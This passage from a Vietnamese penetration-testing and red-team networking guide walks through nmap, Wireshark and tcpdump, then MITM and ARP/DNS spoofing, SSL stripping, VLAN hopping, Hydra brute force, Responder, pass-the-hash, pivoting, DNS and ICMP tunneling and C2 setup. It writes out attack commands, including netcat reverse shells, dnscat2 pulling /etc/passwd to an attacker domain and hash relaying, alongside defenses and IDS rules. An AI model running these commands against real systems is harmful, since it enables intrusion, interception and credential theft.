traceroute -T -p 443 8.8.8.8

# Traceroute dùng ICMP
traceroute -I 8.8.8.8

# Cách hoạt động:
# Gửi packet với TTL=1 → router đầu tiên drop, trả ICMP Time Exceeded
# Gửi packet với TTL=2 → router thứ hai drop
# ... tiếp tục cho đến khi đến đích
```

### netstat / ss
```bash
# Xem tất cả kết nối đang mở
netstat -an                    # Cả hai OS
ss -tuln                       # Linux (nhanh hơn netstat)

# Chi tiết các flag:
# -t : TCP
# -u : UDP
# -l : Listening (đang lắng nghe)
# -n : Hiển thị số (không resolve DNS)
# -p : Hiển thị process ID/name
# -a : All connections

# Xem process nào đang listen
ss -tlnp                       # Linux
netstat -tlnp                  # Linux
netstat -ano                   # Windows (rồi dùng tasklist /fi "PID eq XXX")

# Xem kết nối đến một port cụ thể
ss -tn state established '( dport = :443 )'

# Đếm kết nối theo state
ss -s
```

### ip / ifconfig
```bash
# Xem interface mạng
ip addr show                   # Linux (mới)
ifconfig                       # Linux (cũ) / macOS
ipconfig                       # Windows

# Xem routing table
ip route show
route -n                       # Linux
route print                    # Windows

# Xem ARP table
ip neigh show                  # Linux
arp -a                         # Windows / Linux

# Thay đổi MAC address (hữu ích cho MAC filtering bypass)
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF
ip link set eth0 up
# hoặc dùng macchanger
macchanger -r eth0             # Random MAC
```

### curl / wget
```bash
# GET request
curl http://example.com
curl -v http://example.com     # Verbose (xem headers)
curl -I http://example.com     # Chỉ headers (HEAD request)

# POST request
curl -X POST -d "user=admin&pass=123" http://example.com/login
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://example.com/api

# Theo redirect
curl -L http://example.com

# Với cookie
curl -b "session=abc123" http://example.com
curl -c cookies.txt http://example.com/login    # Lưu cookie
curl -b cookies.txt http://example.com/admin    # Dùng cookie

# Download file
curl -O http://example.com/file.zip
wget http://example.com/file.zip

# Ignore SSL certificate (cho self-signed cert)
curl -k https://example.com

# Qua proxy
curl -x http://127.0.0.1:8080 http://example.com        # HTTP proxy
curl -x socks5://127.0.0.1:1080 http://example.com      # SOCKS5 proxy
```

## 2.2 Wireshark

**Wireshark** là công cụ phân tích packet mạnh nhất. Bắt buộc phải thành thạo.

### Capture Filters (lọc KHI bắt packet)
```
# Chỉ bắt traffic từ/đến một IP
host 192.168.1.100

# Chỉ bắt traffic đến một port
port 80
port 443

# Chỉ bắt TCP
tcp

# Chỉ bắt traffic của một subnet
net 192.168.1.0/24

# Kết hợp
host 192.168.1.100 and port 80
```

### Display Filters (lọc SAU KHI bắt)
```
# Lọc theo protocol
http
dns
tcp
udp
arp
icmp
tls
smb

# Lọc theo IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 10.0.0.1

# Lọc theo port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Lọc theo TCP flags
tcp.flags.syn == 1
tcp.flags.syn == 1 && tcp.flags.ack == 0    # Chỉ SYN (không phải SYN-ACK)
tcp.flags.rst == 1

# Lọc HTTP
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.host contains "example"
http.request.uri contains "admin"

# Lọc DNS
dns.qry.name contains "example"
dns.flags.response == 1

# Lọc theo nội dung (string search)
frame contains "password"
tcp contains "login"

# Kết hợp phức tạp
(ip.src == 192.168.1.100) && (tcp.dstport == 80) && (http.request.method == "POST")

# Follow TCP Stream: Right-click packet → Follow → TCP Stream
# → Xem toàn bộ cuộc hội thoại HTTP/TCP
```

### Phân tích Wireshark thực tế

**Phát hiện ARP Spoofing**:
```
arp.duplicate-address-detected
# Hoặc tìm: nhiều ARP reply cho cùng IP nhưng MAC khác nhau
```

**Phát hiện Port Scan**:
```
# Nhiều SYN đến nhiều port khác nhau từ cùng IP
tcp.flags.syn == 1 && tcp.flags.ack == 0
# Rồi xem Statistics → Conversations → TCP
```

**Phát hiện DNS Tunneling**:
```
dns
# Tìm: DNS queries với subdomain rất dài hoặc TXT records lớn bất thường
dns.qry.name.len > 50
```

## 2.3 tcpdump

**tcpdump** = Wireshark dạng command line. Dùng trên server không có GUI.

```bash
# Bắt tất cả traffic
sudo tcpdump -i eth0

# Bắt và lưu file pcap (mở bằng Wireshark sau)
sudo tcpdump -i eth0 -w capture.pcap

# Đọc file pcap
tcpdump -r capture.pcap

# Lọc theo host
sudo tcpdump -i eth0 host 192.168.1.100

# Lọc theo port
sudo tcpdump -i eth0 port 80

# Lọc theo protocol
sudo tcpdump -i eth0 tcp
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 icmp

# Hiển thị nội dung packet (hex + ASCII)
sudo tcpdump -i eth0 -X port 80

# Chỉ hiển thị ASCII
sudo tcpdump -i eth0 -A port 80

# Bắt N packet rồi dừng
sudo tcpdump -i eth0 -c 100 port 80

# Không resolve DNS (nhanh hơn)
sudo tcpdump -i eth0 -n port 80

# Kết hợp phức tạp
sudo tcpdump -i eth0 'src 192.168.1.100 and dst port 443'
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'    # Chỉ SYN packets

# Bắt traffic HTTP (xem nội dung)
sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

---

# PHẦN 3: NETWORK SCANNING & ENUMERATION

## 3.1 Nmap (Network Mapper) - Công cụ scan số 1

### Host Discovery (Tìm host sống)

```bash
# Ping scan (không scan port)
nmap -sn 192.168.1.0/24

# ARP scan (chỉ trong LAN, chính xác nhất)
nmap -PR -sn 192.168.1.0/24

# TCP SYN ping (-PS mặc định port 80, ở đây chỉ định port 443)
nmap -PS443 -sn 192.168.1.0/24

# TCP ACK ping
nmap -PA80 -sn 192.168.1.0/24

# UDP ping
nmap -PU53 -sn 192.168.1.0/24

# ICMP ping
nmap -PE -sn 192.168.1.0/24

# Không ping (scan luôn, hữu ích khi ICMP bị chặn)
nmap -Pn 192.168.1.100

# Scan từ file danh sách
nmap -iL targets.txt -sn
```

### Port Scanning Techniques

```bash
# TCP SYN Scan (Half-open, mặc định, cần root)
# Gửi SYN → nhận SYN-ACK = open, RST = closed, không trả lời = filtered
sudo nmap -sS 192.168.1.100

# TCP Connect Scan (Full handshake, không cần root)
nmap -sT 192.168.1.100

# UDP Scan (chậm vì phải chờ ICMP unreachable)
sudo nmap -sU 192.168.1.100

# TCP ACK Scan (phát hiện firewall rules, không phát hiện port open/closed)
# Nhận RST = unfiltered, không trả lời = filtered
sudo nmap -sA 192.168.1.100

# FIN Scan (Stealth - gửi FIN, port closed trả RST, open im lặng)
sudo nmap -sF 192.168.1.100

# Xmas Scan (FIN + PSH + URG flags)
sudo nmap -sX 192.168.1.100

# Null Scan (không set flag nào)
sudo nmap -sN 192.168.1.100

# Window Scan (giống ACK nhưng check window size)
sudo nmap -sW 192.168.1.100

# Maimon Scan (FIN + ACK)
sudo nmap -sM 192.168.1.100

# IDLE/Zombie Scan (cực kỳ stealth, dùng zombie host)
sudo nmap -sI zombie_host:port target

# Scan port cụ thể
nmap -p 80 192.168.1.100
nmap -p 80,443,8080 192.168.1.100
nmap -p 1-1000 192.168.1.100
nmap -p- 192.168.1.100           # TẤT CẢ 65535 ports
nmap --top-ports 100 192.168.1.100

# Scan cả TCP và UDP
nmap -sS -sU -p T:80,443,U:53,161 192.168.1.100
```

### Service & Version Detection

```bash
# Xác định service version
nmap -sV 192.168.1.100

# Intensity (0-9, mặc định 7)
nmap -sV --version-intensity 5 192.168.1.100

# OS Detection
sudo nmap -O 192.168.1.100

# Aggressive scan (OS + version + script + traceroute)
nmap -A 192.168.1.100

# Script scan (NSE - Nmap Scripting Engine)
nmap -sC 192.168.1.100           # Default scripts
nmap --script=vuln 192.168.1.100 # Vulnerability scripts

# Script cụ thể
nmap --script=http-title 192.168.1.100
nmap --script=smb-vuln-ms17-010 192.168.1.100
nmap --script=dns-brute example.com
nmap --script=http-enum 192.168.1.100     # Enum directories
```

### Nmap Scan kết hợp phổ biến

```bash
# Full TCP scan + version + default scripts + OS
sudo nmap -sS -sV -sC -O -p- 192.168.1.100 -oA full_scan

# Quick scan
nmap -T4 -F 192.168.1.100

# Stealth scan
sudo nmap -sS -T2 -f --data-length 24 192.168.1.100
# -T2: Chậm (ít bị phát hiện)
# -f: Fragment packets
# --data-length: Thêm random data vào packet

# Scan qua proxy/tor
nmap --proxies socks4://127.0.0.1:9050 192.168.1.100

# Output formats
nmap -oN output.txt 192.168.1.100     # Normal
nmap -oX output.xml 192.168.1.100     # XML
nmap -oG output.gnmap 192.168.1.100   # Grepable
nmap -oA output 192.168.1.100         # Cả 3 format
```

### NSE Scripts quan trọng

```bash
# Brute force
nmap --script=ssh-brute -p 22 192.168.1.100
nmap --script=ftp-brute -p 21 192.168.1.100
nmap --script=http-brute -p 80 192.168.1.100

# Vulnerability detection
nmap --script=vuln 192.168.1.100
nmap --script=smb-vuln* 192.168.1.100
nmap --script=ssl-heartbleed 192.168.1.100

# Enumeration
nmap --script=smb-enum-shares 192.168.1.100
nmap --script=smb-enum-users 192.168.1.100
nmap --script=http-methods 192.168.1.100
nmap --script=http-robots.txt 192.168.1.100

# Information gathering
nmap --script=whois-domain example.com
nmap --script=http-headers 192.168.1.100
nmap --script=ssl-cert 192.168.1.100
nmap --script=http-title 192.168.1.100
```

## 3.2 Masscan - Scanner siêu nhanh

```bash
# Scan nhanh toàn bộ Internet cho port 80
masscan 0.0.0.0/0 -p80 --rate=100000

# Scan subnet
masscan 192.168.1.0/24 -p1-65535 --rate=1000

# Output dạng list (dùng làm input cho nmap)
masscan 192.168.1.0/24 -p80,443 --rate=1000 -oL results.txt

# Kết hợp với nmap
masscan 10.0.0.0/8 -p80,443 --rate=10000 -oL open_hosts.txt
# Parse masscan output → nmap input (masscan format khác nmap -iL)
grep '^open' open_hosts.txt | awk '{print $4}' | sort -u > nmap_targets.txt
nmap -sV -sC -iL nmap_targets.txt
```

## 3.3 Netcat (nc) - Swiss Army Knife

```bash
# Banner grabbing
nc -nv 192.168.1.100 80
# Gõ: GET / HTTP/1.1
# Host: 192.168.1.100

# Port scan đơn giản
nc -znv 192.168.1.100 1-1000

# Listener (chờ kết nối)
nc -lvnp 4444

# Connect back (reverse shell) — cần ncat (nmap) hoặc nc.traditional, KHÔNG dùng nc.openbsd
# Install: sudo apt install ncat  HOẶC  sudo apt install netcat-traditional
nc 192.168.1.200 4444 -e /bin/bash      # Linux
nc 192.168.1.200 4444 -e cmd.exe        # Windows
# Nếu không có -e, dùng mkfifo: xem Phần 20

# File transfer
# Bên nhận:
nc -lvnp 4444 > received_file
# Bên gửi:
nc 192.168.1.200 4444 < file_to_send

# Chat đơn giản
# Server: nc -lvnp 4444
# Client: nc 192.168.1.200 4444

# Port forwarding với socat (nc nâng cao)
socat TCP-LISTEN:8080,fork TCP:internal:80
```

---

# PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG

> **CHÚ Ý**: Chỉ thực hiện trong môi trường lab hoặc khi có authorization.

## 4.1 Man-in-the-Middle (MITM)

### ARP Spoofing/Poisoning

**Nguyên lý**: ARP không có xác thực. Bất kỳ ai cũng có thể gửi ARP Reply giả để nói "IP gateway là MAC của tôi".

```
Bình thường:
Victim → Gateway (192.168.1.1, MAC: AA:AA:AA:AA:AA:AA) → Internet

Sau ARP Spoof:
Victim → Attacker (192.168.1.1, MAC: CC:CC:CC:CC:CC:CC) → Gateway → Internet
          ↑ Attacker nhận TẤT CẢ traffic của victim
```

**Thực hiện**:
```bash
# Bật IP forwarding (để traffic vẫn đi tiếp, victim không mất mạng)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Dùng arpspoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # Nói victim: "gateway là tôi"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # Nói gateway: "victim là tôi"

# Dùng ettercap (có GUI và nhiều plugin)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Dùng bettercap (hiện đại hơn)
sudo bettercap -iface eth0
> net.probe on                   # Tìm host trong mạng
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on                   # Bắt traffic
```

### Phòng chống ARP Spoofing:
- Dynamic ARP Inspection (DAI) trên switch
- Static ARP entries cho gateway
- ArpWatch / XArp để giám sát
- 802.1X authentication

### SSL Stripping

**Nguyên lý**: Khi victim truy cập `http://bank.com`, server redirect sang `https://bank.com`. Attacker chặn redirect này, giữ kết nối HTTP với victim và HTTPS với server.

```bash
# Với bettercap
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on

# Với sslstrip (cổ điển)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -l 10000
```

**HSTS bypass**: Nếu site dùng HSTS (HTTP Strict Transport Security), SSL strip không hoạt động vì browser nhớ phải dùng HTTPS. Bypass: đổi domain (bank.com → bankk.com).

```
SSL Stripping Flow:

┌────────┐  HTTP request    ┌──────────┐  HTTPS request   ┌────────┐
│ Victim │ ───────────────> │ Attacker │ ────────────────> │ Server │
│        │ <─────────────── │ (MITM)   │ <──────────────── │ (Bank) │
│        │  HTTP response   │          │  HTTPS response   │        │
└────────┘  (NO padlock!)   └──────────┘  (encrypted)      └────────┘

Timeline:
1. Victim → http://bank.com (plaintext)
2. Server → 301 Redirect to https://bank.com
3. Attacker INTERCEPTS redirect, keeps HTTP with victim
4. Attacker → https://bank.com (real HTTPS to server)
5. Attacker relays content: HTTPS→HTTP (strips SSL)
6. Victim sees http://bank.com (no padlock, no warning)
7. Victim enters credentials → Attacker captures in plaintext!
```

### DNS Spoofing

**Nguyên lý**: Attacker đã MITM, chặn DNS query và trả DNS response giả.

```bash
# Với bettercap
sudo bettercap -iface eth0
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.200   # IP của attacker
> dns.spoof on

# Với ettercap
# Tạo file etter.dns:
# example.com  A  192.168.1.200
# *.example.com  A  192.168.1.200
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//
```

### DNS Cache Poisoning (Kaminsky Attack)

```
Nguyên lý chi tiết:
DNS resolver gửi query → chờ response → cache kết quả
Response phải match: Transaction ID (16-bit), Source port, Query name

Kaminsky Attack (2008):
1. Attacker hỏi resolver: "random123.target.com" (không tồn tại)
2. Resolver forward query đến authoritative NS
3. TRƯỚC KHI real NS trả lời, attacker flood responses giả:
   - Guess Transaction ID (65536 possibilities)
   - Response chứa: "random123.target.com doesn't exist,
     BUT ns1.target.com is now ATTACKER-IP" (Authority section)
4. Nếu TxID match → resolver CACHE authority record
5. Từ giờ, MỌI query cho *.target.com → attacker server!

Tại sao nguy hiểm:
- Attacker không cần MITM, chỉ cần gửi packet đến resolver
- Poison 1 lần → ảnh hưởng ALL users của resolver đó
- Can redirect email (MX record), web, any service

Defense:
- Source port randomization (tăng entropy, khó guess TxID + port)
- DNSSEC validation (cryptographic proof of DNS records — biện pháp riêng biệt)
- DNS over HTTPS (DoH) / DNS over TLS (DoT)

┌─────────┐  "random123.target.com?"   ┌──────────┐
│  Client  │ ──────────────────────────>│ Resolver │
└─────────┘                             └────┬─────┘
                                             │ Forward query
                                             v
                                        ┌──────────┐
                                        │ Real NS  │ (slow response)
                                        └──────────┘
                              ┌──────────┐
                              │ Attacker │ FLOOD fake responses
                              │          │ with guessed TxID
                              └──────────┘
                              "ns1.target.com = ATTACKER-IP"
                              If TxID matches → POISONED!
```

### DNS Rebinding

```bash
# Nguyên lý:
# 1. Victim visits attacker.com
# 2. attacker.com DNS resolves to ATTACKER-IP (passes firewall check)
# 3. Page loads JavaScript, waits for DNS TTL to expire
# 4. attacker.com DNS now resolves to 127.0.0.1 (or internal IP!)
# 5. JavaScript makes request to attacker.com = request to 127.0.0.1
# 6. Same-Origin Policy satisfied (still "attacker.com")
# → Access internal services from victim's browser!

# Attack tool: singularity of origin
# Tấn công: Truy cập router admin (192.168.1.1), internal APIs, localhost services

# Defense:
# - DNS pinning (browser caches DNS beyond TTL)
# - Block private IPs in DNS responses (dnsmasq: stop-dns-rebind)
# - Validate Host header on internal services
```

## 4.2 DHCP Attacks

### DHCP Starvation

**Nguyên lý**: Gửi hàng ngàn DHCP Discover với MAC address giả → hết IP pool → host mới không lấy được IP.

```bash
# Dùng Yersinia
yersinia dhcp -attack 1 -interface eth0

# Hoặc dùng dhcpstarv
dhcpstarv -i eth0
```

### Rogue DHCP Server

**Nguyên lý**: Sau khi starve DHCP server thật, dựng DHCP server giả cung cấp gateway = IP attacker.

```bash
# Dùng metasploit
use auxiliary/server/dhcp
set SRVHOST 192.168.1.200
set NETMASK 255.255.255.0
set ROUTER 192.168.1.200          # Gateway = attacker!
set DNSSERVER 192.168.1.200       # DNS = attacker!
run
```

**Phòng chống**: DHCP Snooping trên switch.

## 4.3 VLAN Attacks

### VLAN Hopping - Switch Spoofing

**Nguyên lý**: Attacker giả làm switch, thiết lập trunk link → truy cập tất cả VLAN.

```bash
# Dùng Yersinia
yersinia dtp -attack 1 -interface eth0

# Thủ công với Linux (thêm VLAN interface)
modprobe 8021q
ip link add link eth0 name eth0.200 type vlan id 200   # vconfig đã deprecated
ip link set eth0.200 up
dhclient eth0.200                 # Lấy IP từ VLAN 200
```

### Double Tagging

**Nguyên lý**: Gửi frame với 2 VLAN tags. Switch bỏ tag ngoài (native VLAN), forward frame với tag trong đến VLAN đích.

**Điều kiện**: Attacker phải ở native VLAN, chỉ hoạt động một chiều.

```
Double-Tag VLAN Frame:

Normal frame:
┌──────────┬──────────┬──────────┬──────────────────────┬─────┐
│ Dest MAC │ Src MAC  │ 802.1Q   │ Payload              │ FCS │
│          │          │ VLAN 10  │                       │     │
└──────────┴──────────┴──────────┴──────────────────────┴─────┘

Double-tagged frame:
┌──────────┬──────────┬──────────┬──────────┬───────────┬─────┐
│ Dest MAC │ Src MAC  │ Outer    │ Inner    │ Payload   │ FCS │
│          │          │ 802.1Q   │ 802.1Q   │           │     │
│          │          │ VLAN 1   │ VLAN 20  │           │     │
│          │          │(native)  │(target)  │           │     │
└──────────┴──────────┴──────────┴──────────┴───────────┴─────┘
                       ↑                     ↑
                       Switch strips this    This reaches target VLAN!

Flow:
[Attacker VLAN 1] → Switch A strips outer tag → Trunk → Switch B sees inner VLAN 20 tag → [Victim VLAN 20]
```

**Phòng chống**:
- Không dùng VLAN 1 làm native VLAN
- Tắt DTP trên tất cả access ports (`switchport nonegotiate`)
- Tất cả access port phải gán VLAN rõ ràng

## 4.4 MAC Flooding

**Nguyên lý**: Switch có bảng CAM (Content Addressable Memory) với giới hạn entries. Gửi nhiều frame với MAC source giả → bảng CAM đầy → switch chuyển sang chế độ hub (broadcast tất cả) → attacker thấy tất cả traffic.

```bash
# Dùng macof
macof -i eth0

# Dùng Yersinia
yersinia -I                       # Interactive mode
```

**Phòng chống**: Port Security trên switch (giới hạn số MAC per port).

## 4.5 Password Attacks trên Network Services

### Hydra - Brute Force Online

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P wordlist.txt 192.168.1.100 http-get /admin

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.100

# SMB
hydra -l admin -P wordlist.txt smb://192.168.1.100

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.100

# Với username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Giới hạn thread (tránh bị phát hiện/lock account)
hydra -t 4 -l admin -P wordlist.txt ssh://192.168.1.100
```

### CrackMapExec / NetExec - AD/SMB Swiss Army Knife

> **Lưu ý**: CrackMapExec đã được rename thành **NetExec (nxc)** từ 2023. Cú pháp tương tự, thay `crackmapexec` → `nxc`. Ví dụ dưới dùng tên cũ cho quen thuộc.

```bash
# SMB password spray
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'

# Với user list
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt

# Pass-the-Hash
crackmapexec smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'

# Enum shares
crackmapexec smb 192.168.1.100 -u admin -p 'pass' --shares

# Enum users
crackmapexec smb 192.168.1.100 -u admin -p 'pass' --users

# Execute command
crackmapexec smb 192.168.1.100 -u admin -p 'pass' -x 'whoami'

# WinRM
crackmapexec winrm 192.168.1.100 -u admin -p 'pass'
```

## 4.6 Responder - LLMNR/NBT-NS/MDNS Poisoning

**Nguyên lý**: Khi Windows resolve tên mà DNS thất bại, nó fallback sang LLMNR/NBT-NS (broadcast). Responder trả lời broadcast này → victim gửi credentials (NTLM hash) cho attacker.

```bash
# Chạy Responder
sudo responder -I eth0 -wrf

# Kết quả: Bắt được NTLMv2 hash
# [SMB] NTLMv2-SSP Hash: admin::DOMAIN:challenge:hash

# Crack hash với hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Hoặc relay hash (không cần crack)
ntlmrelayx.py -tf targets.txt -smb2support
```

## 4.7 Sniffing

### Passive Sniffing

```bash
# Wireshark: chọn interface → Start capture
# Hoặc tcpdump
sudo tcpdump -i eth0 -w sniff.pcap

# Tìm credentials trong capture
# HTTP POST (form login)
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i 'pass\|user\|login'

# FTP credentials
tcpdump -i eth0 -A 'tcp port 21' | grep -i 'user\|pass'

# Dùng dsniff (tự động extract credentials)
dsniff -i eth0
```

### Active Sniffing (phải MITM trước)
```bash
# Kết hợp ARP spoof + sniff
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t victim gateway &
arpspoof -i eth0 -t gateway victim &
dsniff -i eth0
# hoặc
wireshark &
```

**Phòng chống Sniffing:**
- Encrypt mọi traffic: TLS/HTTPS, SSH, VPN (không dùng FTP/Telnet/HTTP plaintext)
- Switch thay hub (switch gửi frame đúng port, không broadcast)
- Port Security trên switch (giới hạn MAC per port)
- 802.1X authentication (chỉ authenticated devices mới access network)
- Network segmentation (giảm broadcast domain)
- Detect ARP spoofing (DAI) → ngăn active sniffing

---

# PHẦN 5: RED TEAM NETWORKING

## 5.1 Network Pivoting (Di chuyển qua mạng)

**Pivoting là gì?** Khi bạn compromise được 1 host, dùng nó làm bàn đạp để truy cập mạng internal mà bạn không thể truy cập trực tiếp.

```
Internet ──→ [Firewall] ──→ DMZ (10.10.10.0/24)
                                  │
                                  │ Compromised Host (10.10.10.5)
                                  │ Dual-homed (also on 172.16.0.0/24)
                                  │
                              Internal Network (172.16.0.0/24)
                              ← Đây là nơi bạn muốn đến
```

### SSH Tunneling (Phương pháp phổ biến nhất)

```bash
# === Local Port Forwarding ===
# Kịch bản: Bạn muốn truy cập internal web server (172.16.0.10:80)
# qua compromised host (10.10.10.5)
ssh -L 8080:172.16.0.10:80 user@10.10.10.5
# Giờ: localhost:8080 → 10.10.10.5 → 172.16.0.10:80

# === Remote Port Forwarding ===
# Kịch bản: Internal host không thể connect ra, nhưng bạn có VPS
# Trên compromised host:
ssh -R 9090:172.16.0.10:80 user@your-vps
# Giờ: your-vps:9090 → compromised-host → 172.16.0.10:80

# === Dynamic Port Forwarding (SOCKS Proxy) ===
# Kịch bản: Muốn truy cập TOÀN BỘ internal network
ssh -D 1080 user@10.10.10.5
# Cấu hình proxychains dùng socks5://127.0.0.1:1080
# Giờ: proxychains nmap 172.16.0.0/24

# === SSH qua nhiều hop (ProxyJump) ===
ssh -J user@jump1,user@jump2 user@target
# hoặc trong ~/.ssh/config:
# Host target
#     ProxyJump jump1,jump2

# === Reverse SSH tunnel (từ compromised host gọi về attacker) ===
# Trên attacker:
ssh -R 2222:localhost:22 attacker@attacker-vps
# Giờ attacker có thể: ssh -p 2222 localhost → vào compromised host
```

### Chisel (HTTP Tunneling - Bypass Firewall)

**Chisel** tạo tunnel qua HTTP, bypass firewall chỉ cho phép port 80/443.

```bash
# === Trên attacker (server mode) ===
chisel server --reverse --port 8080

# === Trên compromised host (client) ===
# SOCKS proxy
chisel client attacker-ip:8080 R:socks

# Port forwarding cụ thể
chisel client attacker-ip:8080 R:3389:172.16.0.10:3389

# Sau đó trên attacker:
proxychains nmap -sT 172.16.0.0/24
# hoặc
proxychains crackmapexec smb 172.16.0.0/24
```

### Ligolo-ng (Modern Tunneling - Tạo interface ảo)

```bash
# === Trên attacker ===
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Thêm route cho internal network
sudo ip route add 172.16.0.0/24 dev ligolo

# === Trên compromised host ===
./ligolo-agent -connect attacker-ip:11601 -ignore-cert

# Trên proxy console:
>> session              # Liệt kê sessions
>> start                # Bắt đầu tunnel

# Giờ trên attacker, truy cập trực tiếp:
nmap -sV 172.16.0.10    # Không cần proxychains!
```

### Metasploit Pivoting

```bash
# Sau khi có meterpreter session
meterpreter> run autoroute -s 172.16.0.0/24
meterpreter> background

# Thêm SOCKS proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run

# Hoặc port forward
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.10
```

## 5.2 Lateral Movement (Di chuyển ngang)

### Pass-the-Hash (PtH)

**Nguyên lý**: NTLM authentication không cần password plaintext, chỉ cần hash.

```bash
# Với pth-winexe
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:hash' //192.168.1.100 cmd

# Với Impacket psexec
psexec.py -hashes :ntlm_hash admin@192.168.1.100

# Với Impacket wmiexec
wmiexec.py -hashes :ntlm_hash admin@192.168.1.100

# Với CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H 'ntlm_hash'
```

### Pass-the-Ticket (PtT) - Kerberos

```bash
# Export ticket từ memory (trên compromised Windows)
mimikatz> sekurlsa::tickets /export

# Import ticket
mimikatz> kerberos::ptt ticket.kirbi

# Hoặc với Rubeus
Rubeus.exe ptt /ticket:base64_ticket
```

### PsExec / WMI / WinRM

```bash
# PsExec (Impacket)
psexec.py domain/admin:password@192.168.1.100

# WMI
wmiexec.py domain/admin:password@192.168.1.100

# WinRM (Evil-WinRM)
evil-winrm -i 192.168.1.100 -u admin -p 'password'
evil-winrm -i 192.168.1.100 -u admin -H 'ntlm_hash'

# DCOM
dcomexec.py domain/admin:password@192.168.1.100

# SMBExec
smbexec.py domain/admin:password@192.168.1.100
```

### RDP

```bash
# Kết nối RDP
xfreerdp /u:admin /p:password /v:192.168.1.100

# Pass-the-Hash RDP (cần Restricted Admin mode)
xfreerdp /u:admin /pth:ntlm_hash /v:192.168.1.100

# RDP qua tunnel
ssh -L 3389:172.16.0.10:3389 user@pivot
xfreerdp /u:admin /p:pass /v:127.0.0.1
```

## 5.3 Tunneling & Covert Channels

### DNS Tunneling

**Nguyên lý**: DNS traffic thường không bị block. Encode dữ liệu vào DNS queries (subdomain) và responses (TXT records).

```bash
# === dnscat2 ===
# Trên attacker (DNS server):
dnscat2-server tunnel.attacker.com

# Trên compromised host:
./dnscat2 tunnel.attacker.com

# Trong dnscat2 console:
dnscat2> session -i 1
command (victim) > shell
command (victim) > download /etc/passwd
command (victim) > upload payload.exe

# === iodine (IP-over-DNS) ===
# Trên attacker:
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Trên compromised host:
iodine -f -P password tunnel.attacker.com

# Giờ có tunnel qua DNS: 10.0.0.1 ↔ 10.0.0.2
ssh user@10.0.0.1 -D 1080    # SOCKS proxy qua DNS tunnel
```

**Phòng chống DNS Tunneling:**
- Restrict outbound DNS: chỉ cho internal DNS resolver query ra ngoài (block client → external DNS trực tiếp)
- Monitor DNS query patterns: subdomain length > 50 chars, high TXT record volume, high entropy subdomains
- DNS firewall / Response Policy Zone (RPZ)
- Analyze DNS query frequency per client (> 100 queries/min = suspicious)
- IDS: `alert dns any any -> any any (dns.query; content:"|3F|"; byte_test:1,>,50,0; msg:"Long DNS subdomain"; sid:2;)`

### ICMP Tunneling

```bash
# === icmpsh (Reverse ICMP shell) ===
# Trên attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py attacker-ip victim-ip

# Trên victim:
icmpsh.exe -t attacker-ip

# === ptunnel-ng (TCP over ICMP) ===
# Server:
ptunnel-ng -r22 -R22

# Client:
ptunnel-ng -p server-ip -l 8022 -r22 -R22
ssh -p 8022 user@127.0.0.1
```

**Phòng chống ICMP Tunneling:**
- Block/restrict ICMP echo outbound tại firewall (hoặc limit payload size ≤ 64 bytes)
- Deep Packet Inspection trên ICMP (payload > 64 bytes = suspicious)
- Monitor ICMP traffic volume (bất thường = tunneling)
- IDS rule: `alert icmp any any -> any any (dsize:>100; msg:"Large ICMP payload"; sid:1;)`

### HTTP/HTTPS Tunneling

```bash
# === reGeorg / Neo-reGeorg ===
# Upload tunnel script (PHP/ASP/JSP) lên web server compromised

# Trên attacker:
python neoreg.py generate -k password
# Upload tunnel.php lên target web server

python neoreg.py -k password -u http://target.com/tunnel.php
# SOCKS proxy ở 127.0.0.1:1080

# === Pivotnacci ===
# Tương tự reGeorg nhưng mới hơn
```

## 5.4 C2 (Command & Control) Frameworks

> Chỉ dùng trong authorized pentest/red team engagement.

### Cobalt Strike (Commercial)

```
Workflow:
1. Team Server: ./teamserver <ip> <password>
2. Client kết nối vào Team Server
3. Tạo Listener (HTTP, HTTPS, DNS, SMB)
4. Tạo Payload (Beacon)
5. Deliver payload cho target
